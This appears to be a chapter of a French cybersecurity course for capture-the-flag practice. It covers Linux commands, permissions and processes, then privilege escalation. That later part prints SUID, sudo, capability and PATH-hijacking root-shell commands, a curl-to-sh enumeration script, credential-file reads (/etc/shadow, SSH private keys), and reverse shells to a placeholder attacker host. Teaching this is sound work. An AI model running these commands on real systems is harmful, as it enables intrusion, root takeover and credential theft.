# Chapitre 05 — Système & Linux

## Pourquoi Linux ?

La grande majorité des serveurs, systèmes embarqués et outils de sécurité tournent sur Linux. Maîtriser le terminal Linux est **indispensable** pour la cybersécurité.

---

## Architecture Linux

```
Utilisateur
    ↓
Shell (bash, zsh...)
    ↓
Système de fichiers
    ↓
Noyau (Kernel)
    ↓
Matériel (CPU, RAM, Disque...)
```

### Arborescence de fichiers Linux
```
/               → Racine du système
├── bin/        → Binaires essentiels (ls, cat, cp...)
├── boot/       → Noyau et bootloader
├── dev/        → Fichiers de périphériques
├── etc/        → Fichiers de configuration
├── home/       → Répertoires des utilisateurs
│   └── alice/
├── lib/        → Bibliothèques partagées
├── proc/       → Pseudo-fichiers (processus, kernel)
├── root/       → Répertoire de root
├── sbin/       → Binaires système (root)
├── tmp/        → Fichiers temporaires (effacés au redémarrage)
├── usr/        → Applications utilisateur
│   ├── bin/
│   └── share/
└── var/        → Données variables (logs, bases de données...)
    └── log/
```

---

## Commandes essentielles

### Navigation et fichiers
```bash
pwd                     # Afficher le répertoire courant
ls                      # Lister les fichiers
ls -la                  # Avec fichiers cachés et permissions
ls -lh                  # Tailles lisibles (K, M, G)
cd /chemin              # Changer de répertoire
cd ..                   # Remonter d'un niveau
cd ~                    # Aller dans son home
cd -                    # Retourner au répertoire précédent

cat fichier.txt         # Afficher le contenu
less fichier.txt        # Afficher par pages (q pour quitter)
head -n 20 fichier.txt  # 20 premières lignes
tail -n 20 fichier.txt  # 20 dernières lignes
tail -f fichier.log     # Suivre en temps réel

cp source dest          # Copier
mv source dest          # Déplacer / renommer
rm fichier              # Supprimer
rm -rf dossier          # Supprimer récursivement (ATTENTION)
mkdir nom               # Créer un dossier
touch fichier           # Créer un fichier vide / mettre à jour l'horodatage
```

### Recherche
```bash
# Chercher des fichiers
find / -name "flag.txt" 2>/dev/null
find / -type f -name "*.txt" 2>/dev/null
find / -perm -4000 2>/dev/null     # Fichiers SUID
find / -user root -writable 2>/dev/null  # Fichiers root modifiables

# Chercher dans le contenu
grep "motif" fichier.txt
grep -r "motif" /chemin/         # Récursif
grep -i "motif" fichier.txt      # Insensible à la casse
grep -l "motif" *.txt            # Afficher uniquement les noms de fichiers
grep -n "motif" fichier.txt      # Avec numéros de ligne

# Combinaison
find / -name "*.conf" 2>/dev/null | xargs grep -l "password"
```

### Filtrage et traitement
```bash
# cut — extraire des colonnes
cat /etc/passwd | cut -d: -f1    # Extraire les noms d'utilisateurs
echo "a:b:c" | cut -d: -f2      # "b"

# awk — traitement de colonnes
ps aux | awk '{print $1, $11}'  # Utilisateur et commande
cat fichier.txt | awk -F: '{print $1}'

# sed — substitution
echo "Bonjour monde" | sed 's/monde/Linux/'
sed -i 's/ancien/nouveau/g' fichier.txt  # Modifier en place

# sort — trier
sort fichier.txt
sort -n nombres.txt       # Tri numérique
sort -r fichier.txt       # Inverse
sort -u fichier.txt       # Unique (dédupliqué)

# uniq — supprimer les doublons consécutifs
sort fichier.txt | uniq
sort fichier.txt | uniq -c   # Compter les occurrences

# tr — remplacer des caractères
echo "Bonjour" | tr 'a-z' 'A-Z'  # Majuscules
echo "Bonjour" | tr -d 'o'        # Supprimer les 'o'

# wc — compter
wc -l fichier.txt     # Lignes
wc -w fichier.txt     # Mots
wc -c fichier.txt     # Octets
```

### Pipe et redirections
```bash
commande1 | commande2        # Envoyer la sortie de cmd1 vers cmd2
commande > fichier.txt       # Rediriger vers un fichier (écrase)
commande >> fichier.txt      # Ajouter à la fin du fichier
commande 2>/dev/null         # Ignorer les erreurs
commande 2>&1                # Rediriger erreurs vers la sortie standard
commande 2>&1 | tee log.txt  # Afficher ET écrire dans un fichier
```

---

## Permissions Linux

```bash
ls -la
# -rwxr-xr-- 1 alice users 1234 jan 1 10:00 script.sh
#  ↑↑↑ ↑↑↑ ↑↑↑
#  |   |   |
#  |   |   └─ Autres (others) : r--
#  |   └───── Groupe (group)  : r-x
#  └───────── Propriétaire    : rwx
```

```
r = read    (4)  → lire le fichier
w = write   (2)  → modifier le fichier
x = execute (1)  → exécuter le fichier

rwx = 7, rw- = 6, r-x = 5, r-- = 4
```

```bash
# Modifier les permissions
chmod 755 script.sh     # rwxr-xr-x
chmod +x script.sh      # Rendre exécutable
chmod -w fichier.txt    # Enlever le droit d'écriture
chmod u+x,g-w script   # Modifier par catégorie

# Modifier le propriétaire
chown alice fichier.txt
chown alice:users fichier.txt
chown -R alice:users dossier/  # Récursif
```

### Les bits spéciaux — SUID, SGID, Sticky bit

```bash
# SUID (Set User ID) — s'exécute avec les droits du propriétaire
# Crucial pour l'escalade de privilèges !
chmod u+s programme
# Apparaît comme : -rwsr-xr-x (s à la place du x user)

# Trouver tous les binaires SUID (surtout ceux de root)
find / -perm -4000 -user root 2>/dev/null
find / -perm /4000 2>/dev/null

# Exemples de binaires SUID dangereux
/usr/bin/passwd   # Légitime (modifier son mot de passe)
/usr/bin/find     # Dangereux si SUID root (voir GTFOBins)
/usr/bin/vim      # Dangereux si SUID root
```

---

## Utilisateurs et groupes

```bash
# Informations sur l'utilisateur courant
whoami          # Nom d'utilisateur
id              # uid, gid, groupes
id alice        # Informations sur un autre utilisateur

# Fichiers importants
cat /etc/passwd         # Liste des utilisateurs
# Format: login:x:uid:gid:gecos:home:shell
# alice:x:1001:1001::/home/alice:/bin/bash

cat /etc/group          # Liste des groupes
cat /etc/shadow         # Mots de passe hashés (root requis)

# Changer d'utilisateur
su alice                # Devenir alice (mot de passe requis)
su -                    # Devenir root (si connu)
sudo commande           # Exécuter en tant que root

# Voir ce qu'on peut faire avec sudo
sudo -l
```

---

## Variables d'environnement

```bash
# Afficher toutes les variables
env
printenv

# Variables importantes
echo $PATH       # Chemins des exécutables
echo $HOME       # Répertoire home
echo $USER       # Utilisateur courant
echo $SHELL      # Shell utilisé

# Définir une variable
export MAVAR="valeur"

# PATH exploitation : si . est dans $PATH, un exécutable du répertoire courant
# peut remplacer une commande système → vecteur d'attaque !
```

---

## Processus

```bash
ps aux          # Tous les processus
ps aux | grep apache    # Filtrer
top             # Moniteur en temps réel
htop            # Moniteur amélioré (si installé)
kill 1234       # Tuer le processus PID 1234
kill -9 1234    # Forcer l'arrêt

# Voir les ports ouverts et les processus associés
ss -tulpn
netstat -tulpn   # Alternative (peut ne pas être installé)
lsof -i :80      # Qui utilise le port 80 ?
```

---

## Escalade de privilèges (Privilege Escalation)

L'escalade de privilèges consiste à passer d'un utilisateur avec peu de droits à `root`.

### Méthodologie
```
1. Énumérer le système
2. Trouver une mauvaise configuration
3. Exploiter la faille
```

### Outils d'énumération automatique
```bash
# LinPEAS — L'outil d'énumération le plus complet
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh

# linux-smart-enumeration
./lse.sh
```

### Vecteurs d'escalade courants

#### 1. Binaires SUID
```bash
# Trouver les binaires SUID
find / -perm -4000 2>/dev/null

# Exploiter avec GTFOBins (https://gtfobins.github.io/)
# Exemple : find avec SUID root
find . -exec /bin/bash -p \; -quit
# -p = preserve permissions (ne pas abandonner les droits SUID)
```

#### 2. sudo -l (commandes autorisées)
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/vim

# Exploiter vim en tant que root
sudo vim -c ':!/bin/bash'
```

**Référence indispensable : [GTFOBins](https://gtfobins.github.io/)** — Recense comment exploiter chaque binaire Unix pour escalader les privilèges.

#### 3. Cron jobs
```bash
# Voir les cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Si un script root est modifiable
ls -la /chemin/vers/script.sh  # Est-il writable ?
echo "bash -i >& /dev/tcp/attaquant/4444 0>&1" >> script.sh
```

#### 4. Capabilities Linux
```bash
# Chercher des capabilities
getcap -r / 2>/dev/null

# Exemple : python avec cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### 5. Variables d'environnement et PATH hijacking
```bash
# Si un script SUID appelle une commande sans chemin absolu
# On peut créer un faux exécutable dans un répertoire prioritaire dans $PATH

echo "/bin/bash" > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
./script_suid   # Exécute notre /tmp/ls au lieu du vrai ls
```

#### 6. Mots de passe dans les fichiers
```bash
grep -r "password" /etc/ 2>/dev/null
grep -r "passwd" /var/www/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
cat ~/.bash_history
cat ~/.ssh/id_rsa  # Clé privée SSH
```

---

## Reverse Shell

Un **reverse shell** permet d'obtenir un accès shell depuis la machine cible vers la machine attaquante.

```bash
# Sur la machine attaquante : écouter
nc -lvnp 4444

# Sur la machine cible : se connecter
bash -i >& /dev/tcp/ATTAQUANT_IP/4444 0>&1
```

**Référence : [revshells.com](https://www.revshells.com/)** — Générateur de reverse shells.

---

## Challenges Root-Me — Système Linux

Challenges recommandés sur [https://www.root-me.org/fr/Challenges/App-Systeme/](https://www.root-me.org/fr/Challenges/App-Systeme/) :

### Débutant
| Challenge | Points | Technique |
|-----------|--------|-----------|
| **ELF x86 — Stack buffer overflow basique** | 20 pts | Buffer overflow simple |
| **sudo — weak configuration** | 10 pts | Exploiter sudo mal configuré |
| **SUID — Shared Libraries** | 20 pts | Exploitation de SUID |
| **Crontab** | 20 pts | Exploitation de cron |

### Root-Me — Challenges à faire en premier
Commencer par [https://www.root-me.org/fr/Challenges/](https://www.root-me.org/fr/Challenges/) :
- Section **App-Système** : challenges Linux progressifs
- Section **Réaliste** : scénarios réels d'intrusion

---

## Sites pour pratiquer

| Site | Lien | Description |
|------|------|-------------|
| Root-Me App-Système | [https://www.root-me.org/fr/Challenges/App-Systeme/](https://www.root-me.org/fr/Challenges/App-Systeme/) | Challenges système |
| OverTheWire Bandit | [https://overthewire.org/wargames/bandit/](https://overthewire.org/wargames/bandit/) | Linux pour débutants (SSH, fichiers, permissions) |
| GTFOBins | [https://gtfobins.github.io/](https://gtfobins.github.io/) | Exploitation de binaires Unix |
| TryHackMe Linux | [https://tryhackme.com/path/outline/linux-fundamentals](https://tryhackme.com/path/outline/linux-fundamentals) | Bases Linux interactives |
| HackTricks | [https://book.hacktricks.xyz/linux-hardening/privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) | Guide complet d'escalade de privilèges |

---

[← Cryptographie](04-cryptographie.md) | [Retour au README](../README.md) | [Stéganographie →](06-steganographie.md)
